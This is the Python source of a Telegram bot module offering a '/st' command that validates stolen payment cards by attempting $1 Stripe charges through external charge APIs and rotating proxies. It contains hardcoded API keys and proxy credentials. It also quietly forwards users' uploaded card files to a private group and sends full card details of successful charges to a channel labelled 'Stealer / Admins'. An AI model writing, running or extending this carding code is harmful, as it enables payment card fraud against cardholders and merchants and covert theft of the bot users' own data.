import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def _safe_print(*args, **kwargs):
    try:
        sys.stdout.write(" ".join(str(a) for a in args) + kwargs.get("end", "\n"))
        sys.stdout.flush()
    except Exception:
        pass

print = _safe_print

import asyncio
import re
import html
import logging
import time
import psycopg2.extras
import json
import aiohttp
import random
import urllib.parse

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from utils_send import safe_send_message
from database import (
    is_gate_enabled, get_db_connection, 
    create_user, update_user_stats
)
from bin import get_bin_info
from sub import get_premium_status

# Router for this module
def to_math_bold(s: str) -> str:
    bold_map = {
        'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
        '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'
    }
    return "".join(bold_map.get(c, c) for c in str(s))

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "https://atoti-production.up.railway.app/charge"
API_KEY = "DARKANONSHO!!!"

user_last_command_time = {}

DEFAULT_PROXIES = [
    "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
    "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
    "http://1439:jqvFsDEZ&%Sm@p102.squidproxies.com:9292",
    "http://1439:jqvFsDEZ&%Sm@p103.squidproxies.com:9291",
]

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT proxy FROM proxies WHERE user_id = %s", (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [row[0] for row in rows]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    if not proxies:
        proxies = DEFAULT_PROXIES[:]
    return proxies

def normalize_proxy(proxy: str) -> str:
    if not proxy or not proxy.strip():
        return ""
    proxy = proxy.strip()
    if proxy.startswith(('http://', 'https://')):
        return proxy
    if proxy.startswith('socks5://'):
        return 'http://' + proxy[9:]
    if '@' in proxy and ':' in proxy.split('@')[0]:
        return f'http://{proxy}'
    parts = proxy.split()
    if len(parts) == 4:
        user, pwd, host, port = parts
        return f'http://{user}:{pwd}@{host}:{port}'
    if ':' in proxy and '@' not in proxy:
        parts = proxy.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{proxy}'
    return f'http://{proxy}'

def format_api_proxy(proxy: str) -> str:
    norm = normalize_proxy(proxy)
    if norm.startswith("https://"):
        return "http://" + norm[8:]
    if not norm.startswith("http://") and norm:
        return "http://" + norm
    return norm

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE INITIALIZATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
        print("[DB] ST Stats columns checked/created.")
    except Exception as e:
        print(f"[DB] Error checking stats columns: {e}")

ensure_stats_columns()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def update_user_stats_sync(user_id, is_charged):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s", (user_id,))
        if is_charged:
            cursor.execute("UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"Error updating user stats: {e}")

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if any(k in p for k in ["kashim", "chirag", "darkanon"]): return 'DARKANON <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                    return row['plan']
                return "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "TRIAL"

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.regexp(r'^/(?:st|ffc)(?:\s|$)'))
async def st_command(message: types.Message):
    # 1. GATE CHECK
    if not await asyncio.to_thread(is_gate_enabled, "st"):
        await message.reply(
            "<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗦𝘁𝗿𝗶𝗽𝗲 𝟭$ 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>\n"
            "𝗜𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗯𝗮𝗰𝗸 𝘀𝗵𝗼𝗿𝘁𝗹𝘆 𝘄𝗶𝘁𝗵 𝗲𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗶𝗺𝗽𝗿𝗼𝘃𝗲𝗺𝗲𝗻𝘁𝘀.<tg-emoji emoji-id='5341715473882955310'>⚙️</tg-emoji>",
            parse_mode="HTML"
        )
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    # 2. GET PREMIUM STATUS
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    # 3. RATE LIMITING (free users only)
    if not is_premium:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗶𝗻𝗴.\n"
                    f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗨𝗻𝗹𝗼𝗰𝗸 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗳𝗼𝗿 𝗶𝗻𝘀𝘁𝗮𝗻𝘁, 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘂𝘀𝗲.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    # 4. EXTRACT CARD DETAILS
    parts = message.text.split(maxsplit=1)
    raw_text = ""

    if len(parts) > 1:
        raw_text = parts[1].strip()

    if message.reply_to_message:
        raw_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")
        if message.reply_to_message.document:
            try:
                await message.bot.send_document(
                    chat_id=-1004462990283,
                    document=message.reply_to_message.document.file_id,
                    caption=f"User <a href='tg://user?id={user_id}'>{user.first_name}</a> sent a txt file in /st",
                    parse_mode="HTML"
                )
            except Exception as e:
                logging.error(f"Failed to forward txt file to extra group: {e}")

    if message.document:
        try:
            await message.bot.send_document(
                chat_id=-1004462990283,
                document=message.document.file_id,
                caption=f"User <a href='tg://user?id={user_id}'>{user.first_name}</a> sent a txt file in /st",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Failed to forward txt file to extra group: {e}")

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>Usage:</b> /st <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML"
        )
        return

    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)

    if not match:
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>Invalid Card Format.</b>\n"
            "Please provide CC as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()

    if len(yy_raw) == 4:
        yy = yy_raw[2:]
    else:
        yy = yy_raw

    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # 5. LUHN CHECK
    if not luhn_check(cc):
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>Invalid Card</b>\n"
            "Your card number is incorrect.",
            parse_mode="HTML"
        )
        return

    # 6.5 CHECK PROXIES
    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗙𝗼𝘂𝗻𝗱</b>\n\n"
            "You need to add proxies to use this gate.\n"
            "Use <code>/proxy</code> to add proxies.",
            parse_mode="HTML"
        )
        return

    # Pick a random proxy and format it for Stripe API
    raw_proxy = random.choice(user_proxies)
    proxy = format_api_proxy(raw_proxy)

    # 7. FETCH PLAN NAME
    plan_name = await get_user_plan_name(user_id)

    # 8. SEND PROCESSING MESSAGE
    user_link = f"<a href='tg://user?id={user_id}'>{user.first_name}</a>"
    proc_msg = await message.reply(
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>1</code>\n"
        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸...</b>",
        parse_mode="HTML"
    )

    # 9. LAUNCH BACKGROUND TASK
    asyncio.create_task(
        process_st_check(
            message, proc_msg, user, user_id, formatted_cc, cc, mm, yy, cvv, plan_name, user_proxies
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, mm, yy, cvv, plan_name, user_proxies):
    import time
    start_time = time.time()
    # A. ENSURE USER EXISTS IN DB
    try:
        await asyncio.to_thread(create_user, user_id, user.username)
    except Exception as e:
        logging.error(f"Error ensuring user exists: {e}")

    # Custom Emoji IDs
    CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
    CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
    CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"

    final_status = "𝗘𝗥𝗥𝗢𝗥 <tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji>"
    res_message = "Unknown Error"
    bin_info = {}
    is_charged = False

    # B. RUN STRIPE CHECK via Railway Stripe API (with retries on pasted_fields)
    api_result = {}
    MAX_RETRIES = 10
    attempt = 0

    while attempt < MAX_RETRIES:
        attempt += 1
        raw_proxy = random.choice(user_proxies)
        proxy = format_api_proxy(raw_proxy)

        try:
            cc_encoded = formatted_cc.replace("|", "%7C")
            proxy_encoded = urllib.parse.quote(proxy) if proxy else ""
            api_url = f"https://atoti-production.up.railway.app/charge?cc={cc_encoded}&key=DARKANONSHO!!!&amount=1&proxy={proxy_encoded}"
            timeout = aiohttp.ClientTimeout(total=40)
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=timeout) as resp:
                    if resp.status == 200:
                        api_result = await resp.json()
                    else:
                        # Fallback to Corrigan if Atoti replica returns non-200
                        alt_url = f"https://stripeapi-production-76a7.up.railway.app/stripe/check?gate=corrigan&key=darkanon&cc={cc_encoded}&proxy={proxy}"
                        async with session.get(alt_url, timeout=timeout) as alt_resp:
                            if alt_resp.status == 200:
                                api_result = await alt_resp.json()
                            else:
                                api_result = {"status": "ERROR", "message": f"API Error: HTTP {resp.status}"}
        except asyncio.TimeoutError:
            # On timeout, try quick Corrigan check
            try:
                alt_url = f"https://stripeapi-production-76a7.up.railway.app/stripe/check?gate=corrigan&key=darkanon&cc={cc_encoded}&proxy={proxy}"
                timeout_quick = aiohttp.ClientTimeout(total=15)
                async with aiohttp.ClientSession() as session:
                    async with session.get(alt_url, timeout=timeout_quick) as alt_resp:
                        if alt_resp.status == 200:
                            api_result = await alt_resp.json()
                        else:
                            api_result = {'status': 'ERROR', 'message': 'Timeout'}
            except Exception:
                api_result = {'status': 'ERROR', 'message': 'Timeout'}
        except Exception as e:
            logging.error(f"ST API error: {e}")
            api_result = {'status': 'ERROR', 'message': str(e)}

        charged = str(api_result.get("Charged", "")).lower() == "true" or "charged" in str(api_result.get("Response", "")).lower() or "order_placed" in str(api_result.get("Response", "")).lower()
        approved = str(api_result.get("Approved", "")).lower() == "true" or "approved" in str(api_result.get("Response", "")).lower() or any(k in str(api_result.get("Response", "")).lower() for k in ["insufficient_funds", "invalid_cvc", "3ds"])
        status_raw = api_result.get("status")
        if not status_raw:
            if charged:
                status_raw = "CHARGED"
            elif approved:
                status_raw = "APPROVED"
            elif "Response" in api_result:
                status_raw = "DECLINED"
            else:
                status_raw = "ERROR"
        status_raw = str(status_raw).upper()

        res_message = api_result.get("status_code") or api_result.get("message") or api_result.get("Response", "Unknown Error")
        res_message = str(res_message)

        if status_raw == "ERROR" or "pasted_fields" in res_message.lower() or "requires_confirmation" in res_message.lower() or "empty psk" in res_message.lower():
            logging.info(f"[ST] Attempt {attempt} got retryable error ({res_message}), retrying...")
            continue
        break

    # C. BIN LOOKUP
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception as e:
        logging.error(f"Bin lookup error: {e}")
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    card_type = bin_info.get("type", "N/A")
    level = bin_info.get("brand", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    credits_deduct = 0
    if status_raw == "CHARGED":
        final_status = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji>'
        is_charged = True
        credits_deduct = 2
    elif status_raw == "APPROVED" or "insufficient" in res_message.lower():
        final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>'
        is_charged = True
        credits_deduct = 1
    elif status_raw in ("3DS", "INVALID", "DECLINED") or "3ds" in res_message.lower():
        final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'
        is_charged = False
    else:
        final_status = f'𝗘𝗥𝗥𝗢𝗥 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'
        is_charged = False

    # E. UPDATE USER STATS
    try:
        await asyncio.to_thread(update_user_stats, user_id, is_charged)
    except Exception as e:
        logging.error(f"Failed to update stats: {e}")

    # G. BUILD FINAL MESSAGE
    user_name_safe = html.escape(user.first_name or "User")
    user_link = f'<a href="tg://user?id={user.id}">{user_name_safe}</a>'
    dev_link = '<a href="https://t.me/darkanonp">DARKANON</a>'
    user_display = f"{user_link} ({plan_name})"

    elapsed = round(time.time() - start_time, 1)
    final_caption = (
        f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {final_status}!</b>\n\n"
        f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗖:</b> <code><b>{formatted_cc}</b></code>\n"
        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲:</b> {to_math_bold("Stripe 1 USD")}\n"
        f"<b><tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {to_math_bold(html.escape(str(res_message or 'N/A')))}\n\n"
        f"<b><tg-emoji emoji-id='5042329873662609701'>🗑️</tg-emoji> 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:</b>\n"
        f"<b><tg-emoji emoji-id='5039753786638205957'>🔹</tg-emoji> 𝗕𝗿𝗮𝗻𝗱:</b> {to_math_bold(html.escape(str(bin_scheme or 'N/A')))}\n"
        f"<b><tg-emoji emoji-id='5042020176455795565'>🔸</tg-emoji> 𝗧𝘆𝗽𝗲:</b> {to_math_bold(html.escape(str(card_type or 'N/A')))}\n"
        f"<b><tg-emoji emoji-id='5042097984083330584'>🔘</tg-emoji> 𝗟𝗲𝘃𝗲𝗹:</b> {to_math_bold(html.escape(str(level or 'N/A')))}\n"
        f"<b><tg-emoji emoji-id='5343636681473935403'>🏛️</tg-emoji> 𝗕𝗮𝗻𝗸:</b> {to_math_bold(html.escape(str(bin_bank or 'N/A')))}\n"
        f"<b><tg-emoji emoji-id='5042176294222037888'>🌍</tg-emoji> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {to_math_bold(html.escape(str(bin_country or 'N/A')))}\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"<b><tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <code>{elapsed}s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> <b>𝗨𝘀𝗲𝗿 ➛</b> {user_display}\n"
        f"<tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> {dev_link}"
    )

    # H. KEYBOARD
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LightxHub", url="https://t.me/lightxHub_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])

    # I. EDIT THE PROCESSING MESSAGE WITH RESULT
    try:
        await proc_msg.edit_text(
            text=final_caption,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        try:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        except Exception as e2:
            logging.error(f"Fallback reply also failed: {e2}")

    is_charged = "CHARGED" in status_raw
    is_insufficient = "insufficient" in str(res_message).lower()

    if is_charged or is_insufficient:
        hit_label = "CHARGED" if is_charged else "APPROVED"
        hit_emoji = "💎" if is_charged else "✅"

        log_caption = (
            f"<b>Hit ➔</b> {hit_label} {hit_emoji}\n"
            f"<b>GATE ➔</b> Stripe $1 💸\n"
            f"<b>Res ➔</b> {html.escape(str(res_message or 'Approved'))}\n"
            f"<b>USER ➔</b> {user_display}"
        )
        reply_markup_logs = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/lightxHub_bot", style="primary")]
        ])

        try:
            # Broadcast to logs channel (Clean 4 lines)
            await safe_send_message(message.bot,
                chat_id=-1004462990283,
                text=log_caption,
                parse_mode="HTML",
                reply_markup=reply_markup_logs,
            )
            # Broadcast to Stealer / Admins channel (-1004348615901) with Full Card
            await safe_send_message(message.bot,
                chat_id=-1004348615901,
                text=final_caption,
                parse_mode="HTML",
                reply_markup=reply_markup,
            )
        except Exception as e:
            logging.error(f"Failed to broadcast st.py hit: {e}")
